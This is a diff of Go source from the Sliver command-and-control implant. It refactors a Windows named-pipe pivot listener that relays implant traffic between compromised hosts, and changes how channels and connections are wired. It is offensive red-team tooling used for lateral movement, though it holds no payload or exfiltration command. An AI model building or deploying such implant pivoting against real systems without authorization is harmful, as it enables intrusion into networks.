@@ -19,60 +19,49 @@ package pivots
 */
 
 import (
-	"math/rand"
-	"net"
-	"os"
-	"strings"
-	"time"
+	"sync"
 
 	// {{if .Config.Debug}}
 	"log"
 	// {{end}}
 
-	"github.com/bishopfox/sliver/implant/sliver/transports"
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 	"github.com/lesnuages/go-winio"
-	"google.golang.org/protobuf/proto"
-)
-
-var (
-	namedPipePivotReadDeadline  = 10 * time.Second
-	namedPipePivotWriteDeadline = 10 * time.Second
 )
 
 // StartNamedPipePivotListener - Starts a named pipe listener
-func StartNamedPipePivotListener(pipeName string, upstream <-chan *pb.Envelope) (*PivotListener, error) {
-	fullName := "\\\\.\\pipe\\" + pipeName
-	config := &winio.PipeConfig{
+func StartNamedPipePivotListener(address string, upstream chan<- *pb.Envelope) (*PivotListener, error) {
+	fullName := "\\\\.\\pipe\\" + address
+	ln, err := winio.ListenPipe(fullName, &winio.PipeConfig{
 		RemoteClientMode: true,
-	}
-	ln, err := winio.ListenPipe(fullName, config)
+	})
 	// {{if .Config.Debug}}
 	log.Printf("Listening on %s", fullName)
 	// {{end}}
 	if err != nil {
-		return err
+		return nil, err
 	}
-	go namedPipeAcceptConnections(ln)
-	return &PivotListener{
+	pivotLn := &PivotListener{
 		ID:          ListenerID(),
 		Type:        pb.PivotType_NamedPipe,
 		Listener:    ln,
 		Pivots:      &sync.Map{},
 		BindAddress: fullName,
-		upstream:    upstream,
-	}, nil
+		Upstream:    upstream,
+	}
+	go namedPipeAcceptConnections(pivotLn)
+	return pivotLn, nil
 }
 
 func namedPipeAcceptConnections(pivotListener *PivotListener) {
-	hostname, err := os.Hostname()
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("Failed to determine hostname %s", err)
-		// {{end}}
-		hostname = "."
-	}
-	namedPipe := strings.ReplaceAll(pivotListener.Listener.Addr().String(), ".", hostname)
+	// hostname, err := os.Hostname()
+	// if err != nil {
+	// 	// {{if .Config.Debug}}
+	// 	log.Printf("Failed to determine hostname %s", err)
+	// 	// {{end}}
+	// 	hostname = "."
+	// }
+	// namedPipe := strings.ReplaceAll(pivotListener.Listener.Addr().String(), ".", hostname)
 	for {
 		conn, err := pivotListener.Listener.Accept()
 		if err != nil {
@@ -86,13 +75,9 @@ func namedPipeAcceptConnections(pivotListener *PivotListener) {
 			writeMutex:    &sync.Mutex{},
 			readDeadline:  tcpPivotReadDeadline,
 			writeDeadline: tcpPivotWriteDeadline,
+			upstream:      pivotListener.Upstream,
+			Downstream:    make(chan *pb.Envelope),
 		}
-		go func() {
-			// Do not add to pivot listener until key exchange is successful
-			err = pivotConn.Start()
-			if err == nil {
-				pivotListener.Pivots.Store(pivotConn.ID(), pivotConn)
-			}
-		}()
+		go pivotConn.Start(pivotListener.Pivots)
 	}
 }
